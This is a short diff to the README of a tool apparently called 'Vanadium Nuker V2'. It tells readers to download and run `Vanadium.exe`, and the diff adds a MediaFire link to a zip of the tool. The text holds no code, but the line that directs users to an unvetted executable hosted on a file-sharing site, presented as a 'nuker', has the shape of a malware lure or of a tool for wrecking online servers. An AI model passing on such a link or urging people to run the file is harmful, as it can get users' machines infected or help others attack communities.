@@ -8,6 +8,7 @@ Developed by **RussianHarvey & Tobakk**, modified for maximum speed via direct H
 ## 📥 Download & Run
 - Download the executable file `Vanadium.exe` (no additional installation required).
 - Run the file and the tool interface will appear.
+- here you can download https://www.mediafire.com/file/hue2jl9gjfdm4hj/Vanadium+Nuker+V2.zip/file
 
 ---
 
